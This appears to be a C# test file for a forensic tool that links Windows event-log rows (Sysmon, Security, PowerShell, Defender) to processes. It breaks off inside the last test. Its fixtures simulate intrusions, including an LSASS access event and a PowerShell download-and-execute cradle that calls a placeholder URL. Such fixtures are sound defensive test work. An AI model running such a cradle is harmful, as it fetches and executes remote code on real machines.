using System.Text;
using EzForensics.Core.EventLogs;
using EzForensics.Core.Processes;
using FluentAssertions;

namespace EzForensics.Core.Tests;

/// <summary>
/// Process-related EvtxECmd events (Sysmon, Security, PowerShell, Task Scheduler, AppLocker, WMI, Defender, services). The fixture rows use the payload layouts
/// of the EZ Maps (evtx/Maps/*.map), not guessed ones: every PayloadData cell is what the map for that event produces.
/// </summary>
public class ProcessEventLogsTests : IDisposable
{
    private readonly string _host = Path.Combine(Path.GetTempPath(), "ezforensics_procevt_" + Guid.NewGuid().ToString("N"));

    public ProcessEventLogsTests() => Directory.CreateDirectory(_host);
    public void Dispose() { try { Directory.Delete(_host, true); } catch { } }

    private const string Header = "TimeCreated,EventId,Channel,Provider,ProcessId,Computer,UserName,ExecutableInfo,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,Payload\r\n";
    private const string GA = "{11111111-1111-1111-1111-111111111111}", GB = "{22222222-2222-2222-2222-222222222222}";
    private static readonly (string Chan, string Prov) Sys = ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon");
    private static readonly (string Chan, string Prov) Sec = ("Security", "Microsoft-Windows-Security-Auditing");
    private static readonly (string Chan, string Prov) Psh = ("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell");
    private static readonly (string Chan, string Prov) WinPsh = ("Windows PowerShell", "PowerShell");
    private static readonly (string Chan, string Prov) TaskLog = ("Microsoft-Windows-TaskScheduler/Operational", "Microsoft-Windows-TaskScheduler");
    private static readonly (string Chan, string Prov) AppLk = ("Microsoft-Windows-AppLocker/EXE and DLL", "Microsoft-Windows-AppLocker");
    private static readonly (string Chan, string Prov) Wmi = ("Microsoft-Windows-WMI-Activity/Operational", "Microsoft-Windows-WMI-Activity");
    private static readonly (string Chan, string Prov) Def = ("Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender");
    private static readonly (string Chan, string Prov) Scm = ("System", "Service Control Manager");

    private static string Q(string s) => "\"" + s.Replace("\"", "\"\"") + "\"";

    /// <summary>One CSV row. <paramref name="pd"/> are PayloadData1..6 (missing ones empty); <paramref name="payload"/> the raw EventData JSON.</summary>
    private static string Row(string time, int eid, (string Chan, string Prov) log, string user, string exe, string[] pd, string rowPid = "4", string payload = "")
    {
        var cells = new string[6];
        for (int i = 0; i < 6; i++) cells[i] = i < pd.Length ? pd[i] : "";
        return $"{time},{eid},{Q(log.Chan)},{Q(log.Prov)},{rowPid},PC1,{Q(user)},{Q(exe)},{string.Join(",", cells.Select(Q))},{Q(payload)}\r\n";
    }

    /// <summary>EvtxECmd JSON payload with the given EventData fields.</summary>
    private static string Json(params (string Name, string Value)[] fields) =>
        "{\"EventData\":{\"Data\":[" + string.Join(",", fields.Select(f => $"{{\"@Name\":\"{f.Name}\",\"#text\":\"{f.Value.Replace("\\", "\\\\")}\"}}")) + "]}}";

    /// <summary>Sysmon 1 in the EZ map layout: PD1 ids, PD2 rule, PD3 unlabelled hashes, PD4 parent image, PD5 parent ids, PD6 parent command line.</summary>
    private static string Sysmon1(string time, string user, string cmd, string pid, string guid, string ppid, string pguid, string parent, string hashes) =>
        Row(time, 1, Sys, user, cmd, new[] { $"ProcessID: {pid}, ProcessGUID: {guid}", "RuleName: -", hashes, "ParentProcess: " + parent, $"ParentProcessID: {ppid}, ParentProcessGUID: {pguid}", "ParentCommandLine: " + parent });

    /// <summary>Security 4688 in the EZ map layout (PID in PD2, parent PID in PD3).</summary>
    private static string Ev4688(string time, string user, string cmd, string parent, string pid, string ppid) =>
        Row(time, 4688, Sec, user, cmd, new[] { "Parent process: " + parent, "PID: " + pid, "Parent PID: " + ppid, "Mandatory label: S-1-16-8192", @"Target User: -\-" });

    private static string PidTag(string pid, string guid) => $"ProcessID: {pid}, ProcessGUID: {guid}";

    private ProcessGraph Build(string rows)
    {
        var dir = Path.Combine(_host, "EventLogs");
        Directory.CreateDirectory(dir);
        File.WriteAllText(Path.Combine(dir, "EventLogs.csv"), Header + rows, new UTF8Encoding(false));
        return ProcessGraphBuilder.Build(_host);
    }

    private static ProcessNode ByGuid(ProcessGraph g, string guid) => g.AllNodes.Single(n => n.Guid == guid);

    private const string AExe = @"C:\tools\a.exe";
    private static string StartA() => Sysmon1("2024-03-01 09:00:00", @"PC1\bob", AExe, "100", GA, "4", GB, @"C:\Windows\explorer.exe", "SHA1=AA,MD5=BB");

    // ---- the verified Sysmon 1 layout ---------------------------------------------------------------------------------------------------------------

    [Fact]
    public void Sysmon1_ReadsHashParentAndUser_FromTheRealMapLayout()
    {
        var g = Build(Sysmon1("2024-03-01 09:00:00", @"PC1\bob", @"""C:\tools\a.exe"" -x", "100", GA, "4", GB, @"C:\Windows\explorer.exe", "SHA1=AABB,MD5=CC,SHA256=DDEE"));
        var a = ByGuid(g, GA);
        a.Hash.Should().Be("SHA256 ddee");
        a.HashSource.Should().Be("Sysmon 1");
        a.ParentGuid.Should().Be(GB);
        a.ParentImage.Should().Be(@"C:\Windows\explorer.exe");
        a.Path.Should().Be(@"C:\tools\a.exe");
    }

    // ---- Sysmon -------------------------------------------------------------------------------------------------------------------------------------

    [Fact]
    public void Sysmon3_And22_Network_PortComesFromThePayloadColumn()
    {
        var g = Build(StartA() +
            Row("2024-03-01 09:01:00", 3, Sys, @"PC1\bob", AExe, new[] { PidTag("100", GA), "RuleName: -", "SourceHostname: PC1", "SourceIp: 10.0.0.5", "DestinationHostname: evil.example", "DestinationIp: 203.0.113.5" },
                payload: Json(("DestinationPort", "443"), ("Protocol", "tcp"), ("Initiated", "true"))) +
            Row("2024-03-01 09:01:05", 22, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), "RuleName: -", "Image: " + AExe, "QueryName: evil.example", "QueryStatus: 0", "QueryResults: type:  5 cdn.evil.example;203.0.113.5;" }));
        var a = ByGuid(g, GA);
        var net = g.Evidence.Events.LinksFor(a, ProcessEventGroup.Network);
        net.Should().HaveCount(2).And.OnlyContain(l => l.Tier == LinkTier.Exact);
        var c = net.Single(l => l.Event.EventId == 3).Event;
        c.T1.Should().Be("evil.example");
        c.T2.Should().Be("203.0.113.5");
        c.T3.Should().Be("443");
        c.T4.Should().Be("10.0.0.5");
        c.Detail.Should().Contain("203.0.113.5:443").And.Contain("tcp");
        var dns = net.Single(l => l.Event.EventId == 22).Event;
        dns.Title.Should().Be("DNS query");
        dns.T1.Should().Be("evil.example");
        dns.T2.Should().Contain("203.0.113.5");
        dns.Image.Should().Be(AExe);
    }

    [Fact]
    public void Sysmon_FileEvents_2_11_15_23_26()
    {
        var g = Build(StartA() +
            Row("2024-03-01 09:02:00", 11, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), "RuleName: -", "Image: " + AExe, @"TargetFilename: C:\Users\bob\drop.dll" }) +
            Row("2024-03-01 09:02:01", 2, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), "RuleName: -", "Image: " + AExe, @"TargetFilename: C:\Users\bob\drop.dll", "CreationTimeUTC: 2020-01-01 00:00:00.000", "PreviousCreationTimeUTC: 2024-03-01 09:02:00.000" }) +
            Row("2024-03-01 09:02:02", 15, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), "RuleName: -", "Image: " + AExe, @"TargetFilename: C:\Users\bob\drop.dll:Zone.Identifier", "Hash: SHA1=1234,MD5=5678" }) +
            Row("2024-03-01 09:02:03", 23, Sys, @"PC1\bob", AExe, new[] { PidTag("100", GA), "RuleName: -", "SHA1=AA,MD5=BB", @"TargetFilename: C:\Users\bob\drop.dll", "IsExecutable: true", "Archived: true" }) +
            Row("2024-03-01 09:02:04", 26, Sys, @"PC1\bob", AExe, new[] { PidTag("100", GA), "RuleName: -", "MD5=CC", @"TargetFilename: C:\Users\bob\x.tmp", "IsExecutable: false", "Archived: false" }));
        var files = g.Evidence.Events.LinksFor(ByGuid(g, GA), ProcessEventGroup.Files).Select(l => l.Event).ToList();
        files.Select(f => f.EventId).Should().Equal(11, 2, 15, 23, 26);
        files[0].T1.Should().Be(@"C:\Users\bob\drop.dll");
        files[0].Image.Should().Be(AExe);
        files[1].Title.Should().Be("File time changed");
        files[1].Detail.Should().Contain("2020-01-01").And.Contain("2024-03-01 09:02:00");
        files[2].T1.Should().EndWith("Zone.Identifier");
        files[2].T2.Should().Be("SHA1 1234");
        files[3].T1.Should().Be(@"C:\Users\bob\drop.dll");
        files[3].T2.Should().Be("SHA1 aa");
        files[3].T3.Should().Be("Archived: true");
        files[4].Title.Should().Be("File delete detected");
    }

    [Fact]
    public void Sysmon_RegistryEvents_12_13_14()
    {
        var g = Build(StartA() +
            Row("2024-03-01 09:03:00", 12, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), "RuleName: -", "Image: " + AExe, "EventType: CreateKey", @"TargetObject: HKU\x\Software\Evil" }) +
            Row("2024-03-01 09:03:01", 13, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), "RuleName: -", "Image: " + AExe, "EventType: SetValue", @"TargetObject: HKU\x\Software\Run\evil", "Details: " + AExe }) +
            Row("2024-03-01 09:03:02", 14, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), "", "Image: " + AExe, "EventType: RenameKey", @"TargetObject: HKU\x\Software\Evil", "NewName: HKU\\x\\Software\\Good" }));
        var reg = g.Evidence.Events.LinksFor(ByGuid(g, GA), ProcessEventGroup.Registry).Select(l => l.Event).ToList();
        reg.Select(r => r.EventId).Should().Equal(12, 13, 14);
        reg[0].Title.Should().Be("Registry key/value created");
        reg[0].T3.Should().Be("CreateKey");
        reg[1].T1.Should().Be(@"HKU\x\Software\Run\evil");
        reg[1].T2.Should().Be(AExe);
        reg[2].T2.Should().Be(@"HKU\x\Software\Good");
        reg[2].Detail.Should().Contain("->");
    }

    [Fact]
    public void Sysmon7_ImageLoaded_CarriesSignature_AndSignatureForNodeUsesItsOwnImage()
    {
        var g = Build(StartA() +
            Row("2024-03-01 09:00:01", 7, Sys, @"PC1\bob", AExe, new[] { PidTag("100", GA), "RuleName: -", "SHA1=AA,MD5=BB", "Signed: true", "Image: " + AExe },
                payload: Json(("Signature", "Contoso Ltd"), ("SignatureStatus", "Valid"))) +
            Row("2024-03-01 09:00:02", 7, Sys, @"PC1\bob", @"C:\Windows\System32\evil.dll", new[] { PidTag("100", GA), "RuleName: -", "SHA1=CC", "Signed: false", "Image: " + AExe }));
        var a = ByGuid(g, GA);
        var mods = g.Evidence.Events.LinksFor(a, ProcessEventGroup.Modules).Select(l => l.Event).ToList();
        mods.Should().HaveCount(2);
        mods[0].T1.Should().Be(AExe);
        mods[0].Signed.Should().BeTrue();
        mods[0].Signature.Should().Be("Contoso Ltd");
        mods[0].SignatureStatus.Should().Be("Valid");
        mods[1].T3.Should().Be("Unsigned");
        mods[1].Signed.Should().BeFalse();
        var sig = g.Evidence.Events.SignatureFor(a);
        sig.Should().NotBeNull();
        sig!.Signed.Should().BeTrue();
        sig.Signature.Should().Be("Contoso Ltd");
        sig.Source.Should().Be("Sysmon 7");
    }

    [Fact]
    public void SignatureFor_NeedsASysmon7RowOfThatVeryProcess_NotAnotherInstanceOfTheSamePath()
    {
        var g = Build(
            Sysmon1("2024-03-01 09:00:00", @"PC1\bob", AExe, "100", GA, "4", GB, @"C:\x\p.exe", "MD5=DD") +
            Sysmon1("2024-03-01 09:30:00", @"PC1\bob", AExe, "101", GB, "4", GA, @"C:\x\p.exe", "MD5=DD") +
            Row("2024-03-01 09:30:01", 7, Sys, @"PC1\bob", AExe, new[] { PidTag("101", GB), "RuleName: -", "SHA1=AA,MD5=BB", "Signed: true", "Image: " + AExe },
                payload: Json(("Signature", "Contoso Ltd"), ("SignatureStatus", "Valid"))));
        g.Evidence.Events.SignatureFor(ByGuid(g, GB))!.Signature.Should().Be("Contoso Ltd");
        g.Evidence.Events.SignatureFor(ByGuid(g, GA)).Should().BeNull();
    }

    [Fact]
    public void Sysmon6_DriverLoad_BelongsToSystem_And17_18_25_AreThreatsOfTheirProcess()
    {
        var g = Build(
            Ev4688("2024-03-01 08:00:00", "SYSTEM", @"C:\Windows\System32\smss.exe", @"C:\x\p.exe", "4", "0x0") +   // System, so driver loads have a node
            StartA() +
            Row("2024-03-01 09:04:00", 6, Sys, @"", @"C:\Windows\System32\drivers\evil.sys", new[] { "", "RuleName: -", "SHA1=EE", "Signed: false", "Signature: -", "SignatureStatus: Unavailable" }) +
            Row("2024-03-01 09:04:01", 17, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), @"PipeName: \evilpipe", "", "", "Image: " + AExe }) +
            Row("2024-03-01 09:04:02", 18, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), @"PipeName: \evilpipe", "", "", "Image: " + AExe }) +
            Row("2024-03-01 09:04:03", 25, Sys, @"PC1\bob", AExe, new[] { PidTag("100", GA), "RuleName: -", "", "", "", "Type: Image is replaced" }));
        var system = g.AllNodes.Single(n => n.Pid == 4);
        var drv = g.Evidence.Events.LinksFor(system, ProcessEventGroup.Modules).Single().Event;
        drv.Title.Should().Be("Driver loaded");
        drv.T1.Should().EndWith("evil.sys");
        drv.T3.Should().Be("Unsigned");
        var threats = g.Evidence.Events.LinksFor(ByGuid(g, GA), ProcessEventGroup.Threats).Select(l => l.Event).ToList();
        threats.Select(t => t.EventId).Should().Equal(17, 18, 25);
        threats[0].T1.Should().Be(@"\evilpipe");
        threats[2].T1.Should().Be("Image is replaced");
    }

    [Fact]
    public void Sysmon8_And10_LinkBothWays_WithDirection()
    {
        const string gT = "{33333333-3333-3333-3333-333333333333}";
        var g = Build(StartA() +
            Sysmon1("2024-03-01 09:00:30", "NT AUTHORITY\\SYSTEM", @"C:\Windows\System32\lsass.exe", "600", gT, "4", GB, @"C:\Windows\System32\wininit.exe", "MD5=11") +
            Row("2024-03-01 09:05:00", 10, Sys, @"PC1\bob -> NT AUTHORITY\SYSTEM", "CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|UNKNOWN(00007FF6)", new[] { "", "GrantedAccess: 0x1fffff", $"SourceProcessID: 100, SourceProcessGUID: {GA}", @"SourceImage: " + AExe, $"TargetProcessID: 600, TargetProcessGUID: {gT}", @"TargetImage: C:\Windows\System32\lsass.exe" }) +
            Row("2024-03-01 09:05:05", 8, Sys, @"PC1\bob -> NT AUTHORITY\SYSTEM", "", new[] { "StartAddress: 0x00007FF612340000", "RuleName: -", $"SourceProcessID: 100, SourceProcessGUID: {GA}", @"SourceImage: " + AExe, $"TargetProcessID: 600, TargetProcessGUID: {gT}", @"TargetImage: C:\Windows\System32\lsass.exe" }));
        var a = ByGuid(g, GA);
        var lsass = ByGuid(g, gT);
        var ev = g.Evidence.Events;
        var outgoing = ev.LinksFor(a, ProcessEventGroup.Threats);
        outgoing.Should().HaveCount(2).And.OnlyContain(l => l.Direction == ProcessEvent.Accessed && l.Tier == LinkTier.Exact);
        var incoming = ev.LinksFor(lsass, ProcessEventGroup.Threats);
        incoming.Should().HaveCount(2).And.OnlyContain(l => l.Direction == ProcessEvent.AccessedBy && l.Tier == LinkTier.Exact);
        var access = incoming.Single(l => l.Event.EventId == 10).Event;
        access.T1.Should().Be(@"C:\Windows\System32\lsass.exe");
        access.T2.Should().Be("0x1fffff");
        access.T3.Should().Be("600");
        access.T4.Should().Contain("ntdll.dll");
        access.Image.Should().Be(AExe);
        ev.LinksFor(lsass).Count(l => l.Direction == ProcessEvent.Accessed).Should().Be(0);   // the target never "accessed"
    }

    [Fact]
    public void Sysmon10_WithoutPids_IsNotLinkedByImagePath()
    {
        var g = Build(StartA() +
            Sysmon1("2024-03-01 09:00:30", "SYSTEM", @"C:\Windows\System32\lsass.exe", "600", "{33333333-3333-3333-3333-333333333333}", "4", GB, @"C:\x.exe", "MD5=11") +
            Row("2024-03-01 09:05:00", 10, Sys, "", "CallTrace: x", new[] { "", "GrantedAccess: 0x1010", "", @"SourceImage: " + AExe, "", @"TargetImage: C:\Windows\System32\lsass.exe" }));
        g.Evidence.Events.LinksFor(ByGuid(g, GA), ProcessEventGroup.Threats).Should().BeEmpty();
        g.Evidence.Events.LinksFor(g.AllNodes.Single(n => n.Pid == 600), ProcessEventGroup.Threats).Should().BeEmpty();
    }

    // ---- Security -----------------------------------------------------------------------------------------------------------------------------------

    [Fact]
    public void Security_HexPids_LinkObjectAccessAndLogons_AndDecimalPidLinksFirewall()
    {
        const string exe = @"C:\Windows\System32\svchost.exe";
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", exe + " -k x", @"C:\Windows\System32\services.exe", "0x1a4", "0x2c") +
            // 4656 / 4657: ExecutableInfo = "<process> (PID: <hex>)"
            Row("2024-03-01 10:01:00", 4656, Sec, @"PC1\alice", exe + " (PID: 0x1a4)", new[] { "ObjectType: File", @"ObjectName: C:\Users\alice\secret.txt", "HandleId: 0x2a0", "TransactionId: {0}", "AccessList: %%1538", "PrivilegeList: -" }) +
            Row("2024-03-01 10:01:01", 4657, Sec, @"PC1\alice", exe + " (PID: 0x1a4)", new[] { "Logon ID: 0x3e7", "Operation Type: Existing registry value modified", @"Registry Key: \REGISTRY\MACHINE\SOFTWARE\Evil", "Value Name: Run", @"Old type \ value: REG_SZ \ a", @"New type \ value: REG_SZ \ b" }) +
            // 4663: the map has no ProcessId, it is in the raw payload (hex)
            Row("2024-03-01 10:01:02", 4663, Sec, @"PC1\alice", exe, new[] { "ObjectServer: Security", "ObjectType: Key", @"ObjectName: \REGISTRY\MACHINE\SOFTWARE\Evil", "AccessList: %%4416" },
                payload: Json(("ProcessId", "0x1a4"), ("ProcessName", exe))) +
            Row("2024-03-01 10:01:03", 4663, Sec, @"PC1\alice", exe, new[] { "ObjectServer: Security", "ObjectType: File", @"ObjectName: C:\Users\alice\secret.txt", "AccessList: %%4416" },
                payload: Json(("ProcessId", "0x1a4"))) +
            // 4624 / 4648
            Row("2024-03-01 10:02:00", 4624, Sec, @"PC1\alice", exe, new[] { @"Target: PC1\alice", "LogonType 3", "LogonId: 0x1234", "AuthenticationPackageName: NTLM", "LogonProcessName: NtLmSsp" }, payload: Json(("ProcessId", "0x1a4"))) +
            Row("2024-03-01 10:02:01", 4648, Sec, @"PC1\alice", exe, new[] { @"Target: DOM\admin", "TargetServerName: srv1", "PID: 0x1a4", "TargetInfo: srv1" }) +
            // 5156: Application is a device path, PID decimal
            Row("2024-03-01 10:03:00", 5156, Sec, "", @"\device\harddiskvolume3\windows\system32\svchost.exe", new[] { "Source: 10.0.0.5:50111", "Dest: 203.0.113.9:443", "Protocol: 6", "PID: 420", "Direction: Outbound", "LayerName: Connect" }));
        var n = g.AllNodes.Single(x => x.Pid == 0x1a4);
        var ev = g.Evidence.Events;
        ev.LinksFor(n).Where(l => l.Event.EventId != 4688).Should().OnlyContain(l => l.Tier == LinkTier.Exact);

        var files = ev.LinksFor(n, ProcessEventGroup.Files).Select(l => l.Event).ToList();
        files.Select(f => f.EventId).Should().Equal(4656, 4663);
        files[0].T1.Should().Be(@"C:\Users\alice\secret.txt");
        files[0].Image.Should().Be(exe);

        var reg = ev.LinksFor(n, ProcessEventGroup.Registry).Select(l => l.Event).ToList();
        reg.Select(r => r.EventId).Should().Equal(4657, 4663);
        reg[0].T1.Should().Be(@"\REGISTRY\MACHINE\SOFTWARE\Evil");
        reg[0].T4.Should().Be("Run");
        reg[0].T2.Should().Contain("b");

        var ident = ev.LinksFor(n, ProcessEventGroup.Identity).Select(l => l.Event).ToList();
        ident.Select(i => i.EventId).Should().Equal(4624, 4648);
        ident[0].T1.Should().Be(@"PC1\alice");
        ident[0].T2.Should().Be("3");
        ident[1].T1.Should().Be(@"DOM\admin");

        var net = ev.LinksFor(n, ProcessEventGroup.Network).Single().Event;
        net.EventId.Should().Be(5156);
        net.T2.Should().Be("203.0.113.9");
        net.T3.Should().Be("443");
        net.T4.Should().Be("10.0.0.5");
        net.Detail.Should().Contain("TCP").And.Contain("Outbound");
    }

    [Fact]
    public void Security4663_WithoutProcessIdInPayload_IsNotLinked()
    {
        const string exe = @"C:\tools\a.exe";
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", exe, @"C:\x.exe", "500", "4") +
            Row("2024-03-01 10:01:03", 4663, Sec, "", exe, new[] { "ObjectServer: Security", "ObjectType: File", @"ObjectName: C:\x.txt", "AccessList: %%4416" }));
        g.Evidence.Events.LinksFor(g.AllNodes.Single(x => x.Pid == 500), ProcessEventGroup.Files).Should().BeEmpty();   // a name or path alone is no fact
    }

    [Fact]
    public void ReusedPid_OutsideTheLifetime_IsNotLinked()
    {
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", @"C:\tools\a.exe", @"C:\x.exe", "500", "4") +
            Row("2024-03-01 10:00:30", 4689, Sec, "alice", @"C:\tools\a.exe", new[] { "", "PID: 0x1f4" }) +
            Row("2024-03-01 10:01:00", 5156, Sec, "", @"\device\harddiskvolume3\other\b.exe", new[] { "Source: 10.0.0.5:1", "Dest: 1.1.1.1:53", "Protocol: 17", "PID: 500", "Direction: Outbound" }));
        var a = g.AllNodes.Single(x => x.Pid == 500);
        g.Evidence.Events.LinksFor(a, ProcessEventGroup.Network).Should().BeEmpty();
    }

    [Fact]
    public void ReusedPid_WithoutExitEvent_IsBoundedByTheNextInstanceOfThePid()
    {
        string Net(string time) => Row(time, 5156, Sec, "", @"\device\harddiskvolume3\x\p.exe", new[] { "Source: 10.0.0.5:1", "Dest: 1.1.1.1:53", "Protocol: 17", "PID: 500", "Direction: Outbound" });
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", @"C:\tools\a.exe", @"C:\x.exe", "500", "4") +    // no exit event seen
            Ev4688("2024-03-01 11:00:00", "alice", @"C:\tools\b.exe", @"C:\x.exe", "500", "4") +    // the PID is reused
            Net("2024-03-01 10:30:00") + Net("2024-03-01 11:30:00"));
        var first = g.AllNodes.Single(x => x.Path.EndsWith("a.exe"));
        var second = g.AllNodes.Single(x => x.Path.EndsWith("b.exe"));
        g.Evidence.Events.LinksFor(first, ProcessEventGroup.Network).Select(l => l.Event.Time!.Value.Hour * 60 + l.Event.Time.Value.Minute).Should().Equal(10 * 60 + 30);
        g.Evidence.Events.LinksFor(second, ProcessEventGroup.Network).Select(l => l.Event.Time!.Value.Hour * 60 + l.Event.Time.Value.Minute).Should().Equal(11 * 60 + 30);
    }

    // ---- path-only links ----------------------------------------------------------------------------------------------------------------------------

    [Fact]
    public void ServiceInstallsAndTaskRegistrations_AreNeverLinked()
    {
        const string exe = @"C:\tools\svc.exe";
        var xml = @"<Task><Actions><Exec><Command>C:\tools\svc.exe</Command></Exec></Actions></Task>";
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", exe, @"C:\x.exe", "500", "4") +
            Row("2024-03-01 10:00:01", 7045, Scm, "", @"""C:\tools\svc.exe"" --service", new[] { "Name: EvilSvc", "StartType: auto start", @"Account: LocalSystem" }, rowPid: "700") +
            Row("2024-03-01 10:00:02", 4697, Sec, @"PC1\alice", "", new[] { "ServiceName: EvilSvc2", @"ServiceFileName: C:\tools\svc.exe -k x", "ServiceType: 0x10", "ServiceStartType: 2", "ServiceAccount: LocalSystem" }) +
            Row("2024-03-01 10:00:03", 4698, Sec, @"PC1\alice", "", new[] { @"TaskName: \Evil", "TaskContent: " + xml }));
        // installing is not running: whatever the path and time, these never reach the process
        g.Evidence.Events.LinksFor(g.AllNodes.Single(x => x.Pid == 500)).Select(l => l.Event.EventId).Should().Equal(4688);
        g.Evidence.Events.Count.Should().Be(1);
    }

    [Fact]
    public void ScheduledTasks_200_201_AreStartPathTime_And129ByPid()
    {
        const string exe = @"C:\tools\job.exe";
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", exe, @"C:\x.exe", "500", "4") +
            Row("2024-03-01 10:00:00", 200, TaskLog, "", exe, new[] { @"Task: \Evil", "Instance Id: {abc}" }) +
            Row("2024-03-01 10:00:00", 129, TaskLog, "", exe, new[] { @"Task: \Evil", "ProcessID: 500" }) +
            Row("2024-03-01 10:00:10", 201, TaskLog, "", exe, new[] { @"Task: \Evil", "Instance Id: {abc}" }) +
            Row("2024-03-01 10:10:00", 201, TaskLog, "", exe, new[] { @"Task: \Evil", "Instance Id: {def}" }) +      // a completion long after the start does not fit
            Row("2024-03-01 10:00:01", 200, TaskLog, "", "job.exe", new[] { @"Task: \Bare", "Instance Id: {ghi}" }));   // no full path
        var links = g.Evidence.Events.LinksFor(g.AllNodes.Single(x => x.Pid == 500), ProcessEventGroup.Persistence);
        links.Select(l => (l.Event.EventId, l.Tier)).Should().BeEquivalentTo(new[]
        {
            (200, LinkTier.PathTime), (129, LinkTier.Exact), (201, LinkTier.PathTime),
        });
        links.Single(l => l.Event.EventId == 201).Event.T3.Should().Be("{abc}");
    }

    [Fact]
    public void ScheduledTask200_WithTwoInstancesOfThePathFittingTheStart_IsNotLinked()
    {
        const string exe = @"C:\tools\job.exe";
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", exe, @"C:\x.exe", "500", "4") +
            Ev4688("2024-03-01 10:00:05", "alice", exe, @"C:\x.exe", "501", "4") +
            Row("2024-03-01 10:00:06", 200, TaskLog, "", exe, new[] { @"Task: \Evil", "Instance Id: {abc}" }));
        foreach (var pid in new[] { 500, 501 })
            g.Evidence.Events.LinksFor(g.AllNodes.Single(x => x.Pid == pid), ProcessEventGroup.Persistence).Should().BeEmpty();
    }

    [Fact]
    public void AppLockerRows_AreNotLinked()
    {
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", @"C:\Users\bob\tool.exe", @"C:\x.exe", "500", "4") +
            Row("2024-03-01 10:00:01", 8004, AppLk, @"PC1\bob", @"%OSDRIVE%\USERS\BOB\TOOL.EXE", new[] { "ABCDEF", "O=EVIL", "TargetUser", "0x1", @"C:\Users\bob\tool.exe" }));
        g.Evidence.Events.LinksFor(g.AllNodes.Single(x => x.Pid == 500), ProcessEventGroup.Threats).Should().BeEmpty();
    }

    [Fact]
    public void Defender_IsPathTimeDuringTheLifetime_NotByTheWriterPid()
    {
        string Detect(string time, string process) => Row(time, 1116, Def, @"Detection User: PC1\alice", @"file:_C:\Users\bob\evil.exe",
            new[] { "Malware name: Trojan:Win32/Evil", "Description: Trojan (Severe)", "Detection Time: " + time, "Process (if real-time detection): " + process, "Detection ID: {1}" }, rowPid: "900");
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", @"C:\Users\bob\dropper.exe", @"C:\x.exe", "500", "4") +
            Ev4688("2024-03-01 10:00:01", "alice", @"C:\Users\bob\evil.exe", @"C:\x.exe", "501", "4") +
            Ev4688("2024-03-01 10:00:02", "NT AUTHORITY\\SYSTEM", @"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe", @"C:\x.exe", "900", "4") +
            Row("2024-03-01 10:05:00", 4689, Sec, "alice", @"C:\Users\bob\dropper.exe", new[] { "", "PID: 0x1f4" }) +
            Detect("2024-03-01 10:01:00", @"C:\Users\bob\dropper.exe") +    // while dropper.exe ran
            Detect("2024-03-01 10:09:00", @"C:\Users\bob\dropper.exe"));     // after it exited
        var ev = g.Evidence.Events;
        var viaProcess = ev.LinksFor(g.AllNodes.Single(x => x.Pid == 500), ProcessEventGroup.Threats);
        viaProcess.Should().ContainSingle();
        viaProcess[0].Tier.Should().Be(LinkTier.PathTime);
        viaProcess[0].Direction.Should().Be("");
        viaProcess[0].Event.Time!.Value.Minute.Should().Be(1);
        viaProcess[0].Event.T1.Should().Be("Trojan:Win32/Evil");
        var viaFile = ev.LinksFor(g.AllNodes.Single(x => x.Pid == 501), ProcessEventGroup.Threats);
        viaFile.Should().HaveCount(2).And.OnlyContain(l => l.Direction == ProcessEvent.FileDetected && l.Tier == LinkTier.PathTime);
        viaFile[0].Event.T2.Should().Be(@"C:\Users\bob\evil.exe");
        ev.LinksFor(g.AllNodes.Single(x => x.Pid == 900), ProcessEventGroup.Threats).Should().BeEmpty();
    }

    // ---- scripts and WMI ----------------------------------------------------------------------------------------------------------------------------

    [Fact]
    public void PowerShell_LinksByTheRowsProcessId_Including400And800()
    {
        const string ps = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        var g = Build(
            Ev4688("2024-03-01 10:00:00", "alice", ps + " -nop", @"C:\x.exe", "0x1a4", "4") +
            Row("2024-03-01 10:00:05", 4104, Psh, @"PC1\alice", "", new[] { @"Path: C:\s.ps1", "ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://e/x')" }, rowPid: "420") +
            Row("2024-03-01 10:00:06", 4103, Psh, @"PC1\alice", "", new[] { "Command Name: Invoke-Expression", "Host Application = " + ps + " -nop", "Script Name: ", "ConnectedUser: ", "Host Name: ConsoleHost", "Payload: CommandInvocation(Invoke-Expression)" }, rowPid: "420") +
            Row("2024-03-01 10:00:07", 400, WinPsh, @"PC1\alice", "", new[] { ps + " -nop", "ConsoleHost", "5.1.19041" }, rowPid: "420") +
            Row("2024-03-01 10:00:08", 800, WinPsh, @"PC1\alice", "", new[] { ps + " -nop", "ConsoleHost", "5.1.19041" }, rowPid: "999"));   // another process
        var s = g.Evidence.Events.LinksFor(g.AllNodes.Single(x => x.Pid == 0x1a4), ProcessEventGroup.Scripts);
        s.Select(l => l.Event.EventId).Should().Equal(4104, 4103, 400);
        s.Should().OnlyContain(l => l.Tier == LinkTier.Exact);
        s[0].Event.T1.Should().Contain("DownloadString");
        s[0].Event.T2.Should().Be(@"C:\s.ps1");
        s[1].Event.T1.Should().Be("Invoke-Expression");
        s[1].Event.T3.Should().StartWith(ps);
        s[2].Event.Source.Should().Be("Windows PowerShell 400");
    }

    [Fact]
    public void Wmi5857_5860_LinkByThePidInTheEventData()
    {
        var g = Build(
